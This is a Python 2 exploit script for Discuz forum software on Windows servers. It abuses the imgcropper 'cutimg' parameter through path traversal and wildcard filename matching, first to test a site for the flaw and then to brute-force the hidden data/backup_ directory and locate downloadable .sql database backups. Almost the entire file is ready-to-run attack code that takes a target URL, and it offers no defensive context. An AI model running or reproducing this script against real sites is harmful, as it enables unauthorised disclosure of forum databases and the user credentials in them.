#coding:utf-8
#code by Carbon
letter = [chr(i) for i in range(ord('a'),ord('z')+1)]
number = [str(i) for i in range(10)][::-1]

class win_discuz_path:

	global letter
	global number

	def __init__(self,url):
		import requests,re
		self.r = requests.Session()
		self.url = url
		self.ctl = 0	#content-length when exist
		self.directory = '.././../data/backup_'	#data path
		tmp = self.r.get(self.url)
		if tmp.status_code == 200:
			print "[+] url is right"
			#home url
			self.hu = re.sub(r'misc.php.*','',self.url)
			#get hashcode
			h = re.search(r'formhash" value="\w{8}',tmp.content)
			self.formhash = h.group()[17:25]
			print "[+] hashcode is:",self.formhash
		else:
			print "[-] url is invalid"
			print "[-] status:",tmp.status_code

	def poc(self):
		cutimg = {'../stat_setting.xml':0,'../<.<':0,'../s':0}
		data = {'imgcroppersubmit':'true','formhash':self.formhash}
		for i in cutimg:
			data['cutimg'] = i
			cutimg[i] = len(self.r.post(self.url,data).content)
		if cutimg['../stat_setting.xml']==cutimg['../<.<'] and cutimg['../<.<'] !=cutimg['../s']:
			self.ctl = cutimg['../<.<']
			print "[+] may be vulnerable!"
		else:
			print "[+] may not be vulnerable..."

	def exp(self):

		if not self.ctl:
			print '[-] please verify first'
			exit(0)

		print '[+] start burp...'

		burpDict = number + ['-','_','~','/'] + letter
		data = {'imgcroppersubmit':'true','formhash':self.formhash,'cutimg':self.directory}
		isFile = False
		while True:
			pathLen = len(self.directory)
			for i in burpDict:
				if not isFile:
					data['cutimg'] = self.directory+i+'<'
				else:
					data['cutimg'] = self.directory+i+'<.sql'
				ctl = len(self.r.post(self.url,data).content)
				if self.ctl == ctl:
					if i == '/':
						isFile = True
						burpDict.pop(13)	#pop '/'
					self.directory += i
					print '[-]',self.directory
					data['cutimg'] = self.directory
					break
				if i == burpDict[-1]:
					print '[+] done...'
			if pathLen == len(self.directory):
				break
		#test
		if self.directory[-1] != '/':
			file = self.directory[6:-1]
			for i in range(1,100):
				uri = self.hu+file+str(i)+'.sql'
				if self.r.get(uri).status_code == 200:
					print '[+] file exit:',uri

if __name__ == '__main__':
	import sys
	host = sys.argv[1]	#input homepage like http://www.xxx.com/
	url = host + 'misc.php?mod=imgcropper&img=.././../static/image/common/zslt_ios.png'
	print '[+] start...'
	p = win_discuz_path(url)
   	
   	p.poc()
   	p.exp()